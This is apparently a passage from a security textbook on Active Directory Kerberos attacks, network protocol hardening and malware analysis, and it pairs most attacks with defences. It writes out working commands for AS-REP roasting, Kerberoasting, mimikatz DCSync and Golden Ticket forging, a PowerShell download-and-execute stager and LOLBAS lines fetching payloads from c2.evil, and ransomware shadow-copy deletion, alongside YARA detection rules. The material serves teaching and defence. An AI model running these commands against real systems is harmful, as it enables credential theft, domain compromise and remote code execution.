Neither the password nor the long-term key is transmitted on the wire; all secrets are used only to encrypt/decrypt tickets.

Figure 19.1. Kerberos authentication flow: AS exchange, TGS exchange, and service access.

docs.title: 19.6 Active Directory Attack Techniques
docs.text:
AS-REP Roasting

By default, Kerberos requires pre-authentication: the client proves knowledge of its password by encrypting the current timestamp with a key derived from the password. If pre-authentication is disabled for an account (a misconfiguration), any unauthenticated user can request an AS-REP for that account. The AS-REP contains material encrypted with the target account’s key (derivable from the password), which can be extracted and cracked offline.

# Find accounts with pre-auth disabled (requires LDAP read)
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt

# Output: $krb5asrep$23$victim@DOMAIN:HASH...
# Crack with hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt

Defence: Enable pre-authentication on all accounts; disable UF_DONT_REQUIRE_PREAUTH flag; alert on AS-REQ without pre-auth field.

docs.title: AS-REP Roasting in Depth
docs.text:
AS-REP Roasting is notable because it requires no credentials at all to initiate. The UF_DONT_REQUIRE_PREAUTH flag (userAccountControl attribute bit 0x400000) is often set on service accounts that use legacy applications expecting old Kerberos behaviour, or on accounts that were migrated from environments where pre-authentication was disabled domain-wide. Attackers enumerate these accounts through an LDAP query or by simply trying AS-REQ requests for a list of usernames — any account with the flag set will return a response; any without it will return KRB5KDC_ERR_PREAUTH_REQUIRED.

The encrypted portion of the AS-REP (the enc-part field) is encrypted with AES-256 (etype 18) by default on modern domains, or RC4-HMAC (etype 23) on older ones. Hashcat mode 18200 handles the AS-REP format. RC4 hashes crack significantly faster than AES on GPU hardware because RC4 uses a simpler key derivation (single HMAC-MD5 round) versus AES’s PBKDF2-HMAC-SHA1 with 4096 iterations. Attackers often specifically request RC4 encryption in the AS-REQ to receive a faster-cracking response, which is possible if the domain policy allows etype 23.

The contrast with Kerberoasting is instructive. Kerberoasting requires an authenticated domain account (any account, even a low-privilege one) to request a TGS-REP. The TGS is encrypted with the service account’s key rather than the requesting user’s key. Because any SPN-registered account is targetable, Kerberoasting typically goes after high-privilege service accounts (SQL Server service accounts running as domain admins being the classic case). Both attacks yield offline-crackable hashes without generating any failed login events or lockouts, which makes them attractive for low-and-slow reconnaissance. The tell-tale detection signal is an unusual volume of TGS-REQ requests for diverse SPNs from a single source, or AS-REQ messages without the pre-authentication field from non-KDC sources.

Kerberoasting

Any authenticated domain user can request a Service Ticket for any Service Principal Name (SPN). The service ticket is encrypted with the service account’s password hash. Attackers request tickets for high-privilege service accounts (SQL Server, IIS app pools) and crack them offline.

# Request service tickets for all SPNs
impacket-GetUserSPNs domain.local/alice:Password1 -request

# Output: $krb5tgs$23$*serviceaccount$...$HASH
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

Defence: Use Group Managed Service Accounts (gMSA) with 120-character randomly generated passwords; monitor for anomalous TGS-REQ bursts; implement Kerberos AES-only encryption (removes RC4 etype 23, preferred by attackers for faster cracking).

Golden Ticket Attack

If an attacker obtains the krbtgt account’s NTLM hash (by DCSync, NTDS.dit extraction, or direct domain controller compromise), they can forge arbitrary Kerberos TGTs for any user, any group, and any validity period—including tickets valid for 10 years with Domain Admin membership. These Golden Tickets bypass all normal authentication controls.

# Dump krbtgt hash (requires Domain Admin or DCSync rights)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Forge Golden Ticket
mimikatz # kerberos::golden /domain:domain.local \
            /sid:S-1-5-21-... /krbtgt:NTLMHASH \
            /user:Administrator /id:500 /ptt

Defence: Rotate krbtgt password twice (invalidates existing tickets); deploy Microsoft Defender for Identity to detect anomalous ticket properties; enforce Protected Users security group for privileged accounts.

Silver Ticket Attack

With a service account’s NTLM hash (from credential dumping), an attacker can forge a service ticket for that specific service without contacting the KDC—the service validates tickets with its own key, not the KDC. Silver tickets are stealthier than Golden tickets because no KDC interaction occurs.

docs.title: Golden Ticket vs. Silver Ticket: Key Differences
docs.text:
Both Golden and Silver Ticket attacks forge Kerberos tickets to bypass normal authentication, but they operate at different levels of the protocol and have different prerequisites, blast radii, and detection profiles.

A Golden Ticket is a forged TGT (Ticket Granting Ticket) — the credential the KDC issues after successful AS exchange that a user presents to the TGS to get service tickets. The KDC encrypts and signs TGTs with the krbtgt account’s secret key. If an attacker obtains this key (through DCSync, direct NTDS.dit extraction, or memory scraping on a Domain Controller), they can forge TGTs with arbitrary content: any username, any group memberships (including Domain Admins), any validity period. Mimikatz’s kerberos::golden module produces tickets valid for up to 10 years by default. Critically, a Golden Ticket bypasses Active Directory account controls entirely: even if the target user account is disabled or the password is changed, the forged TGT continues to work until either the krbtgt key is rotated (which must be done twice to invalidate all outstanding TGTs, since KDCs accept tickets encrypted with the previous key) or the ticket’s own validity expires. A single Golden Ticket can grant access to every Kerberos service in the domain.

A Silver Ticket is a forged Service Ticket — the credential a client presents directly to a service (CIFS, HTTP, MSSQL) to authenticate. The KDC does not issue or validate service tickets; the service decrypts them using its own account’s secret key. This means the attacker only needs the service account’s NTLM hash (not the krbtgt hash), and the forged ticket never touches the KDC during use. Silver Tickets are therefore much stealthier: there are no KDC authentication events to trigger, no AS-REQ, no TGS-REQ. The limitation is scope — a Silver Ticket for the CIFS service on fileserver01 works only for that specific service on that specific host. Pivoting requires a Silver Ticket per service. Detection relies on the service itself logging authentication events (Windows Event ID 4627) and on monitoring for PAC validation anomalies: Silver Tickets can contain a forged PAC with arbitrary group memberships, but without the KDC’s signature, Privileged Attribute Certificate (PAC) validation against the KDC will fail if enabled. Enabling PAC validation (ValidateKdcPacSignature registry key) on all services is the primary mitigation alongside aggressive service account password management with gMSA.

docs.title: 19.7 Additional AD Attacks: Pass-the-Hash and DCSync
docs.text:
Definition 19.8 (Pass-the-Hash (PtH))

NTLM authentication uses the password hash directly as keying material. An attacker who extracts an NTLM hash from LSASS memory (using Mimikatz or similar) can authenticate to NTLM-accepting services as that user without knowing the plaintext password.

Definition 19.9 (DCSync Attack)

DCSync abuses the DS-Replication-Get-Changes-All Active Directory right (normally held by Domain Controllers) to request replication of account objects including password hashes. An attacker with this right (often obtained through over-privileged service accounts) can extract the entire domain’s password hash database without logging on to a domain controller.

docs.title: 19.8 SMB and NTLM Relay
docs.text:
SMBv1: EternalBlue (MS17-010)

SMBv1 contained a critical buffer overflow in the Windows SMB server (MS17-010, CVE-2017-0144). The NSA exploit EternalBlue allowed unauthenticated remote code execution on all unpatched Windows systems. The WannaCry ransomware (May 2017) exploited EternalBlue to self-propagate across networks, infecting over 200,000 systems in 150 countries. Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false.

SMB Signing Enforcement

SMB signing authenticates each SMB packet with an HMAC-SHA256 tag, preventing NTLM relay attacks where an attacker in a man-in-the-middle position relays authentication from one service to another. Enforce via GPO: Microsoft network server: Digitally sign communications (always) = Enabled.

docs.title: 19.9 SNMP Security
docs.text: Table 19.1. Legacy protocols and their secure replacements Protocol Weakness Replacement Notes SNMPv1/v2c Plaintext community strings SNMPv3 authPriv SHA + AES encryption Telnet Plaintext credential + data SSH-2 SSH with Ed25519 keys FTP Plaintext credential + data SFTP / FTPS SFTP preferred HTTP (admin) No transport encryption HTTPS TLS 1.3 HSTS + valid cert NTPv3 No authentication NTPv4 + NTS RFC 8915 Rlogin/RSH No auth, no encryption SSH-2 Remove from all systems SMBv1 EternalBlue, relay attacks SMBv3 + signing Disable globally LDAP (389) Plaintext bind LDAPS / STARTTLS Or Kerberos GSSAPI

docs.title: 19.10 IPsec: Details and Configuration
docs.text:
Definition 19.10 (IPsec Modes)

IPsec operates in two modes:

  • Transport mode: Encrypts only the IP payload; the original IP header remains. Used for host-to-host communication.

  • Tunnel mode: Encapsulates the entire original IP packet inside a new IP packet; encrypts both header and payload. Used for VPN gateways and site-to-site VPNs.

IPsec protocols: AH (Authentication Header) provides integrity and anti-replay but no confidentiality; ESP (Encapsulating Security Payload) provides confidentiality, integrity, and anti-replay. ESP is used in all modern deployments; AH is largely obsolete.

IKEv1 Aggressive Mode

IKEv1 Aggressive Mode transmits the IKE identity and hashed PSK challenge without encryption, allowing passive interception and offline PSK cracking. It also leaks information about the PSK’s existence before authentication completes. Use IKEv2 exclusively; disable Aggressive Mode on all VPN gateways.

docs.title: 19.10.1 IPsec vs. TLS: When to Use Which
docs.text:
IPsec and TLS both provide confidentiality and integrity for network communications, but they operate at different layers of the stack and are suited to different use cases. Choosing between them is an architectural decision, not a security strength competition.

Layer of operation.

IPsec is a Layer 3 (IP-layer) protocol. It encrypts and authenticates IP packets directly, transparent to the applications above it. Any protocol running over IP — TCP, UDP, ICMP, SCTP — gets protected without any modification to the application. TLS operates at Layer 4/7: it wraps a TCP (or QUIC) connection and is used explicitly by applications. The application must open a TLS connection; plain TCP connections are not automatically protected.

IPsec use cases.

IPsec tunnel mode is the standard for site-to-site VPNs: two network gateways negotiate an IPsec SA and encapsulate all traffic between their networks inside authenticated, encrypted ESP packets. The hosts on each side communicate as if on the same LAN, needing no TLS of their own. IPsec transport mode protects host-to-host communication at the OS level — useful for securing replication traffic between database nodes or management plane traffic between servers without touching application code. Because IPsec lives in the kernel network stack, it’s transparent to all applications and can be enforced by policy on entire subnets.

TLS use cases.

TLS is the right choice when you need per-application, per-connection security: a web server serving HTTPS needs TLS so it can present its own certificate; an API gateway enforcing mTLS needs TLS so it can inspect client certificates and make routing decisions based on identity; a microservice needs TLS to authenticate a specific backend with a specific certificate. TLS also carries the application-layer context (HTTP headers, ALPN protocol negotiation) that IPsec cannot see.

Practical coexistence.

The two protocols often coexist: a site-to-site IPsec VPN encrypts the network path between datacentres, while individual services within those datacentres use mTLS for service-to-service authentication. The IPsec layer prevents passive interception on the wire; the TLS layer provides workload identity and ensures that a compromised host inside the IPsec perimeter cannot impersonate another service. In a zero-trust model, IPsec VPN is deprecated in favour of per-connection mTLS everywhere, since “inside the VPN” is no longer a trust boundary.

Property IPsec TLS OSI Layer Layer 3 (IP) Layer 4/7 (TCP/App) Application change None required App must use TLS API Scope All IP traffic on a path One connection at a time Identity IP address / certificate (IKE) Certificate (per connection) Primary use Site-to-site VPN, host-to-host HTTPS, API, service mesh Packet overhead ESP header + ICV (16–40 bytes) TLS record header (5 bytes) Key management IKEv2 (automated SA negotiation) TLS handshake per session Zero-trust fit Network perimeter focus Per-workload identity

docs.title: 19.11 RADIUS, TACACS+, and 802.1X
docs.text:
Network device authentication — proving who logged into a router, switch, or firewall and what commands they ran — relies on dedicated AAA (Authentication, Authorisation, Accounting) protocols. The two dominant protocols are RADIUS and TACACS+, which differ significantly in their security models and capabilities.

Definition 19.11 (RADIUS (RFC 2865))

Remote Authentication Dial-In User Service (RADIUS) is a UDP-based AAA protocol. The Network Access Server (NAS) — a switch, VPN gateway, or Wi-Fi controller — forwards authentication requests to a RADIUS server (FreeRADIUS, Cisco ISE, Microsoft NPS). RADIUS uses MD5-based request authentication and encrypts only the User-Password attribute, leaving the rest of the packet in cleartext.

Definition 19.12 (TACACS+ (Cisco proprietary, de facto standard))

Terminal Access Controller Access Control System Plus encrypts the entire packet body (not just the password) using a shared secret and MD5. Unlike RADIUS, TACACS+ separates Authentication, Authorisation, and Accounting into distinct exchanges and supports per-command authorisation: the NAS can check with the TACACS+ server whether a specific user is permitted to run show running-config or conf t on a specific device. This command-level granularity makes TACACS+ the preferred protocol for privileged access to network devices.

The shared secret weakness.

Both RADIUS and TACACS+ rely on a shared secret configured on both the NAS and the AAA server. This secret is used to derive keying material via MD5 — a broken hash function for this purpose. An attacker who captures RADIUS traffic and knows or can guess the shared secret can decrypt User-Password attributes or, for TACACS+, the entire session. The shared-secret model also means every NAS is a potential point of exposure: a compromised switch reveals the shared secret for that NAS, which may be the same across all devices if administrators reuse secrets.

RADSEC: RADIUS over TLS (RFC 6614).

RADSEC wraps RADIUS inside a TLS session (TCP port 2083), replacing the MD5-based authentication and encryption with proper TLS. The NAS authenticates the RADIUS server via its TLS certificate, and the RADIUS server can authenticate the NAS via mTLS. The entire exchange is encrypted and integrity-protected with modern cipher suites. RADSEC is the correct answer to RADIUS’s security limitations and is supported by FreeRADIUS 3.x and Cisco ISE. Deployment requires a PKI for issuing NAS and RADIUS server certificates, which is the primary operational barrier.

802.1X and EAP-TLS for port authentication.

802.1X is the IEEE standard for port-based Network Access Control (NAC). Before a device can send traffic on a wired or wireless port, it must authenticate to the network using the Extensible Authentication Protocol (EAP). EAP messages travel between the supplicant (the device), the authenticator (the switch or access point), and the authentication server (RADIUS) in a three-party protocol:

  1. The switch port blocks all traffic except EAP.

  2. The device presents credentials (certificate, username/password, or token) via EAP to the switch.

  3. The switch forwards EAP frames encapsulated in RADIUS Access-Request messages to the RADIUS server.

  4. The RADIUS server validates credentials, returns Access-Accept or Access-Reject, and optionally assigns the port to a VLAN.

  5. The switch opens the port on Accept; the device can now send IP traffic.

EAP-TLS is the strongest EAP method: both the client and the RADIUS server present X.509 certificates, providing mutual authentication and forward secrecy via a TLS handshake inside the EAP tunnel. It requires a device certificate issued to each endpoint (typically via MDM or auto-enrollment via 802.1X group policy), which is operationally significant but eliminates password-based authentication entirely. An attacker with a stolen password but no device certificate cannot authenticate to the network. EAP-PEAP (Protected EAP) and EAP-TTLS are common fallbacks that protect MSCHAPv2 password authentication inside a TLS tunnel, but they remain vulnerable to rogue access point attacks if clients don’t validate the RADIUS server certificate.

Validate the RADIUS Server Certificate

EAP-PEAP and EAP-TTLS clients that don’t validate the RADIUS server certificate are vulnerable to rogue access point attacks: an attacker sets up a fake AP with the same SSID, terminates EAP from the client, and captures the MSCHAPv2 challenge-response. Tools like EAPHammer and hostapd-wpe automate this. Configure supplicants to pin the RADIUS server CA certificate and hostname; reject connections to servers with unknown certificates.

docs.title: 19.12 Exercises
docs.text:
Exercise 19.1

Explain the AS-REP roasting attack in detail. What Active Directory account configuration enables it? Describe the technical steps an attacker takes from initial domain authentication through to obtaining domain administrator credentials. Propose three defensive controls in order of effectiveness, explaining the mechanism by which each control prevents or detects the attack.

Exercise 19.2

Your organisation’s BGP router currently accepts all routes from upstream providers without RPKI validation. Describe the risk this poses with a concrete attack scenario. Outline the steps required to deploy Routinator as an RPKI relying party and integrate it with BIRD or FRRouting to drop RPKI-invalid routes. What percentage of global prefixes would this protect, and what are the operational risks of enabling RPKI route origin validation in “drop invalid” mode?

Exercise 19.3

A security assessment identifies an NTP server on your network responding to monlist queries. Demonstrate how this can be exploited in a DDoS amplification attack with a numerical example (calculate amplification factor). Provide the exact ntp.conf directives required to disable monlist and restrict query access, and describe how NTS would eliminate the need for such restrictions.

docs.title: Chapter 20: Malware Analysis
docs.text: Malware analysis is the discipline of dissecting malicious software to understand its capabilities, persistence mechanisms, command-and-control infrastructure, and indicators of compromise. Analysts combine static and dynamic techniques to characterise threats without compromising production systems.

docs.title: 20.1 Malware Taxonomy
docs.text:
Definition 20.1 (Malware Classification)

Malicious software is classified by propagation method, payload, and interaction with the host:

  • Virus – Self-replicates by infecting legitimate files; requires user execution of the infected host.

  • Worm – Self-propagates across networks without user interaction (e.g., exploiting vulnerabilities).

  • Trojan – Disguises itself as legitimate software to trick users into execution; does not self-replicate.

  • Ransomware – Encrypts victim files and demands payment for decryption keys.

  • Rootkit – Achieves persistence while hiding its presence from the OS and security tools (kernel-level or user-mode).

  • Bootkit – Infects the Master Boot Record or UEFI firmware to execute before the OS loads.

  • RAT (Remote Access Trojan) – Provides the attacker with interactive remote access and control.

  • Botnet – A network of compromised hosts (bots) controlled by a command-and-control server for coordinated attacks.

  • Fileless Malware – Executes entirely in memory using legitimate OS tools (PowerShell, WMI), leaving minimal disk artefacts.

  • Spyware/Adware – Covertly monitors user activity or injects advertisements.

docs.title: 20.2 Static Analysis Workflow
docs.text:
Static analysis examines a binary without executing it, identifying suspicious characteristics while keeping the analyst system safe. The workflow runs from initial triage through structure analysis, as described below.

Definition 20.2 (Static Analysis)

Static analysis encompasses all techniques applied to a binary file without running it: cryptographic identification, string extraction, PE structure analysis, entropy measurement, and signature matching.

[language=bash, caption={Initial triage: hashing and strings},basicstyle= ]
# Compute file hashes for deduplication and threat intel lookup
md5sum    malware.exe
sha256sum malware.exe
# Look up SHA256 on VirusTotal:
# curl "https://www.virustotal.com/api/v3/files/<SHA256>" \
#      -H "x-apikey: $VT_API_KEY" | python3 -m json.tool

# Extract printable ASCII and Unicode strings
strings -n 6 malware.exe | grep -iE \
  "(http|cmd|power|shell|regsvr|rundll|CreateProcess|WinExec)"

# Extract UTF-16 strings (common in Windows PE files)
strings -el malware.exe

# Detect packing / obfuscation with Detect-It-Easy
die malware.exe
# Output: PE64, compiler: Microsoft Visual C++ 2019, packer: UPX 3.96

docs.title: 20.2.1 PE File Structure
docs.text:
Definition 20.3 (Portable Executable (PE) Structure)

Windows executables use the PE format, consisting of:

  • DOS Header – Starts with MZ (0x4D5A); contains offset to PE header.

  • PE Header (COFF) – Machine type, number of sections, timestamp, optional header with entry point and image base.

  • Section Table – Describes each section: .text (code), .data (initialised data), .rdata (read-only data), .rsrc (resources), .reloc (relocations).

  • Import Directory – Lists DLLs and functions the binary calls (e.g., kernel32.dll !VirtualAlloc, wininet.dll !InternetOpenA).

  • Export Directory – Functions exposed to other modules (present in DLLs).

import pefile, math, sys

def entropy(data):
    """Calculate Shannon entropy of a byte string."""
    if not data:
        return 0.0
    freq = [data.count(bytes([b])) for b in range(256)]
    length = len(data)
    return -sum((f/length) * math.log2(f/length)
                for f in freq if f > 0)

pe = pefile.PE(sys.argv[1])

print("=== Imports ===")
for entry in getattr(pe, 'DIRECTORY_ENTRY_IMPORT', []):
    dll = entry.dll.decode()
    funcs = [imp.name.decode() for imp in entry.imports if imp.name]
    print(f"  {dll}: {', '.join(funcs[:5])}")

print("\n=== Section Entropy ===")
for section in pe.sections:
    name = section.Name.rstrip(b'\x00').decode()
    ent  = entropy(section.get_data())
    flag = " << HIGH ENTROPY (packed/encrypted?)" if ent > 7.0 else ""
    print(f"  {name:10s}  entropy={ent:.3f}{flag}")

docs.title: 20.3 YARA Rules
docs.text:
Definition 20.4 (YARA)

YARA is a pattern-matching tool for identifying and classifying malware based on textual or binary patterns (strings), combined with Boolean conditions. YARA rules are the de-facto standard for threat hunting and malware classification in both endpoint security products and threat intelligence platforms.

rule SuspiciousPowerShellLoader {
    meta:
        description = "Detects PE with PowerShell execution via WinAPI"
        author      = "Analyst Team"
        severity    = "high"
    strings:
        $mz          = { 4D 5A }                  // MZ header
        $ps_encoded  = "powershell" nocase
        $bypass      = "-ExecutionPolicy Bypass" nocase
        $virt_alloc  = "VirtualAlloc" nocase
        $create_thrd = "CreateRemoteThread" nocase
    condition:
        $mz at 0 and
        ($ps_encoded or $bypass) and
        ($virt_alloc or $create_thrd)
}

rule RansomwareVSSDelete {
    meta:
        description = "Detects shadow copy deletion (ransomware behaviour)"
        tlp         = "WHITE"
    strings:
        $vss1 = "vssadmin delete shadows" nocase
        $vss2 = "wmic shadowcopy delete" nocase
        $vss3 = { 76 73 73 61 64 6D 69 6E }   // "vssadmin" hex
        $wbadmin = "wbadmin delete catalog" nocase
    condition:
        any of ($vss1, $vss2, $vss3, $wbadmin)
}

# Scan single file
yara -r rules/ malware.exe

# Scan directory recursively, show matching rule + file
yara -r /opt/yara-rules/malware/ /var/quarantine/

# Integrate with VirusTotal Intelligence (requires API subscription)
# vt hunt rulesets create --name "PowerShellLoaders" \
#         --rules rules/suspicious_ps.yar

docs.title: 20.3.1 YARA Rules for Malware Classification: Structure and PE Conditions
docs.text:
A YARA rule combines three elements: metadata (informational, not used in matching), strings (byte patterns, text patterns, or regular expressions), and a condition (a Boolean expression over the strings and built-in PE module attributes). The power of YARA comes from mixing content matching with structural conditions on the binary format.

The pe module gives rules access to PE header fields without string matching: pe.number_of_sections, pe.imphash(), pe.exports(), pe.machine (architecture), pe.timestamp (compilation timestamp), and pe.section_ index(".text"). characteristics. A well-crafted rule for a specific malware family might match a combination of: an import hash that places the binary in the same compilation environment as known samples, a specific export function name, a mutex string seen in dynamic analysis, and a PE section with entropy above 7.5 (indicating packed or encrypted payload). This multi-condition approach dramatically reduces false positives compared to single-string rules.

Import hash (imphash) for family attribution.

The import hash (imphash) is an MD5 hash of the normalised import table: DLL names and function names are lowercased, sorted, and concatenated before hashing. Malware built from the same source code with the same compiler settings will have the same imphash regardless of the binary’s content. VirusTotal displays the imphash for every PE file, and threat intelligence databases like Threat Intelligence Platform correlate samples by imphash. When you encounter a new sample, searching VirusTotal for the imphash often surfaces related samples that attribution teams have already classified, giving you a starting point for family identification. The limitation: repacking with UPX or encrypting the import table (a common obfuscation technique) changes the imphash. Analysts therefore use imphash alongside other features rather than in isolation.

PEiD patterns.

PEiD (PE IDentifier) is an older tool whose signature database identifies packers, compilers, and protectors by matching byte patterns at the entry point and in specific sections. The PEiD database (now integrated into Detect-It-Easy as db.txt) contains thousands of signatures in the format [pattern at offset] = compiler/packer name. These signatures identify, for example, UPX-packed binaries (60 BE ?? ?? ?? ?? 8D BE at entry point), MPRESS-packed binaries, or Delphi-compiled executables (which have distinctive VCL import patterns). Knowing the packer is the prerequisite for unpacking: different packers require different techniques to reach the original entry point (OEP) and dump the unpacked binary.

docs.title: 20.4 Dynamic Analysis
docs.text:
Definition 20.5 (Dynamic Analysis)

Dynamic analysis executes the malware sample in a controlled environment (sandbox or isolated VM) and observes its runtime behaviour: API calls, file system changes, registry modifications, network connections, and child process creation.

Dynamic Analysis Toolchain

  • Cuckoo Sandbox – Open-source automated malware analysis system; reports API calls, network traffic, dropped files.

  • ANY.RUN – Interactive cloud sandbox; analyst controls the sample in real time; extracts IoCs and MITRE ATT&CK mapping.

  • Process Monitor (ProcMon) – Sysinternals; captures all file, registry, and process/thread events.

  • API Monitor – Hooks Windows API calls; shows arguments and return values.

  • FakeNet-NG – Simulates network services (DNS, HTTP, SMTP) to capture C2 communication without internet access.

  • Wireshark – Captures all network packets for offline analysis.

docs.title: 20.4.1 Sandbox Detection and Evasion Techniques
docs.text:
Sophisticated malware knows it may be running in an automated sandbox and changes behaviour accordingly — either by doing nothing malicious (making the sandbox report “clean”) or by terminating immediately. Understanding these techniques helps analysts design sandbox environments that are harder to detect.

Environmental fingerprinting.

The most common checks are:

  • Short system uptime: Cuckoo and similar sandboxes boot a fresh VM for each analysis, meaning uptime is typically under 5 minutes. Real user machines have been running for hours or days. Malware calls GetTickCount() or reads \.\ PHYSICALDRIVE0 and bails out if uptime is under a threshold. Sandbox countermeasure: patch the VM’s uptime to a realistic value before detonation.

  • Low process count: A freshly booted analysis VM has 30–40 processes. A real user’s machine running Office, a browser, Teams, and background services has 150–250 processes. Malware calls EnumProcesses and counts. Counter: run a process injection tool to inflate the process list.

  • VM artefacts: VMware guest additions leave registry keys (HKLM\SOFTWARE\ VMware, Inc.\VMware Tools), registry values, and driver files (vmhgfs.sys, vmci.sys). VirtualBox leaves VBoxService.exe and VBOX registry keys. CPUID hypervisor bit (ECX bit 31 on CPUID leaf 1) indicates a virtualised environment.

  • Screen resolution and input: Sandbox VMs often run at 800x600 or 1024x768 with no user interaction. Malware calls GetSystemMetrics to check resolution and GetLastInputInfo to verify that mouse movement or keystrokes have occurred recently. If no user interaction is detected, the malware sleeps or exits.

  • Sleep evasion: Malware calls Sleep(600000) (10 minutes) to outlast sandbox timeouts (typically 2–5 minutes). Sandboxes patch Sleep to return immediately, but sophisticated malware uses alternative timing methods: NtDelayExecution, busy-wait loops, or cryptographic computations designed to take a specific amount of time.

What this means for analysis.

Behavioural analysis must account for evasion. A sample that shows no malicious behaviour in a 3-minute automated sandbox run may be highly active at the 10-minute mark. Manual analysis with interactive sandboxes (ANY.RUN with user interaction simulation) or analysis in a bare-metal environment (no VM artefacts) reveals evasive samples. Analysts should also look for the evasion checks themselves in static analysis: calls to GetTickCount, EnumProcesses, GetSystemMetrics, IsDebuggerPresent, and CheckRemoteDebuggerPresent in the import table are strong indicators that the sample is environment-aware, warranting additional analysis time and a hardened sandbox configuration.

docs.title: 20.5 Ransomware Analysis
docs.text:
Example 20.1 (Ransomware Encryption Scheme Analysis)

Modern ransomware uses a hybrid encryption scheme to prevent offline decryption:

  1. Malware contains (or fetches) the attacker’s RSA public key.

  2. For each victim, malware generates a random AES-256 key.

  3. Files are encrypted with AES-256 (CBC or CTR mode).

  4. The AES key is encrypted with the attacker’s RSA public key and stored in the ransom note or alongside the encrypted file.

  5. Decryption is only possible with the attacker’s RSA private key, which remains on their server.

Analysis target: extract the embedded RSA public key from the binary; determine whether IV is reused (enables cryptanalysis); check for keylogging of the generated AES key before encryption.

# Shadow copy deletion (most ransomware families)
# Monitor for:
wmic shadowcopy delete
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No

# File extension changes (monitor with ProcMon filter: "Path ends with")
# .locked, .encrypted, .RYUK, .conti, .[random 5-8 chars]

# Network: C2 check-in before encryption begins
# Often POST to /gate.php or /check-in with victim ID + system info

# Registry: persistence before encryption
# HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# HKLM\SYSTEM\CurrentControlSet\Services\[servicename]

docs.title: 20.6 Rootkit Techniques
docs.text:
Definition 20.6 (SSDT Hook)

The System Service Descriptor Table (SSDT) maps system call numbers to kernel function addresses. A kernel rootkit modifies SSDT entries to redirect calls to system functions (e.g., NtQueryDirectoryFile) through rootkit-controlled code that filters out hidden processes or files before returning results to user space.

Definition 20.7 (DKOM (Direct Kernel Object Manipulation))

DKOM modifies kernel data structures in memory to hide objects from the OS. Unlinking a process from the PsActiveProcessHead doubly linked list, for example, causes it to be invisible to tasklist and Task Manager while the process continues to execute.

docs.title: 20.6.1 UEFI Bootkits: Pre-OS Persistence
docs.text:
Traditional rootkits operate inside the OS kernel and can be removed by booting from external media and cleaning the infected volume. UEFI bootkits take persistence to the firmware level, executing before the OS loader starts and surviving both OS reinstallation and hard drive replacement. They represent the deepest and most difficult-to-remediate class of persistence known to affect commodity hardware.

How UEFI bootkits work.

The UEFI firmware stored in SPI (Serial Peripheral Interface) flash memory on the motherboard initialises hardware, then reads the EFI System Partition (ESP) on the boot drive and executes the bootloader stored there (e.g., EFI\Microsoft\Boot\bootmgfw.efi). A bootkit can insert itself at two points:

  1. SPI flash implant: Modify the UEFI firmware image in the SPI flash chip itself. This survives OS reinstall and hard drive replacement because the flash is on the motherboard. Writing to SPI flash typically requires ring-0 (kernel) access to disable write protection, or physical access with a flash programmer.

  2. ESP bootloader replacement: Replace the bootloader on the EFI System Partition with a malicious one that loads the legitimate OS bootloader after establishing persistence. This is easier to deploy (filesystem write access suffices) but is removed by reinstalling the OS or reformatting the ESP.

In both cases, the bootkit can disable Secure Boot by replacing or manipulating the UEFI Secure Boot database (db/dbx UEFI variables), disable BitLocker by manipulating TPM PCR measurements, or inject malicious code into the Windows kernel before any security software loads.

Real-world examples.

LoJax (2018, APT28/Fancy Bear) was the first publicly documented in-the-wild UEFI rootkit. It modified the UEFI firmware image stored in SPI flash on targeted Windows laptops, adding a malicious UEFI module that dropped a Windows trojan to disk on every boot. It was discovered by ESET researchers through analysis of a targeted attack against European government entities. LoJax persisted through OS reinstall on affected machines because the SPI flash was not updated during reinstall.

MosaicRegressor (2020, attributed to a Chinese-linked APT) was found deployed against NGOs and diplomatic entities. It used a compromised UEFI firmware image to maintain a loader that fetched additional payloads from C2 infrastructure on each boot. Kaspersky researchers discovered it through analysis of memory artifacts and UEFI capsule images collected during incident response.

FinFisher/FinSpy (commercial surveillance tool) has used both ESP-level and SPI-level persistence in different versions, making it one of the earliest commercially sold tools to implement UEFI implant capabilities.

Detection.

Standard EDR and AV tools cannot detect SPI-level implants because they run after the OS has loaded and the malicious code is already in control. Detection requires:

  • Chipsec: An open-source framework (Intel) that reads the SPI flash contents directly via kernel-level MMIO access and compares the firmware image against a known-good baseline. Running chipsec_main.py with the tools.uefi.whitelist module checks for unexpected UEFI modules. This requires a pre-compromise baseline and kernel-level execution, typically as part of a trusted boot environment.

  • Measured boot via TPM: The UEFI firmware measures (computes SHA-256 hashes of) each component it executes and extends the measurements into TPM PCR registers. The sequence: UEFI ROM hash into PCR0, EFI boot manager into PCR4, OS bootloader into PCR8, and so on. A remote attestation service can verify that PCR values match expected values for clean firmware. Any modification to UEFI code changes the PCR chain and produces a measurably different PCR state. Microsoft’s Secure Launch (DRTM) and attestation via Microsoft Azure Attestation or AMD SEV-SNP implement this in enterprise environments.

  • Secure Boot prevents unauthorised code from executing in the UEFI pre-boot environment by verifying digital signatures on bootloaders and OS kernels. It does not prevent SPI flash modification (an attacker with physical access can write new firmware directly), but it prevents unsigned bootloader replacement on the ESP and raises the bar for software-only implants.

Remediation.

A confirmed SPI-level implant requires a firmware re-flash with a known-good image using the vendor’s recovery process (which typically involves a USB drive with a firmware capsule and a BIOS reset). Simply reinstalling Windows does not help. In some cases, motherboard replacement is the only assured remediation path if the SPI flash protection fuses are not set. Organisations with high-value targets (classified government systems, critical infrastructure operators) maintain hardware baseline images and periodically re-flash firmware as part of their supply-chain security programme.

docs.title: 20.7 Fileless Malware and LOLBAS
docs.text:
PowerShell In-Memory Execution

Fileless malware uses built-in OS tools to avoid writing executable files to disk, evading file-based AV:

# Download and execute in memory (commonly used by stagers)
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden \
  -Command "IEX (New-Object Net.WebClient).DownloadString(\
  'http://c2.evil/payload.ps1')"

# Reflective DLL injection: load DLL from memory without LoadLibrary
# CreateRemoteThread -> shellcode -> loads PE from heap

# LOLBAS examples (Living Off the Land Binaries and Scripts):
# mshta.exe    http://c2.evil/payload.hta
# regsvr32.exe /s /n /u /i:http://c2.evil/com.sct scrobj.dll
# certutil.exe -urlcache -split -f http://c2.evil/nc.exe nc.exe

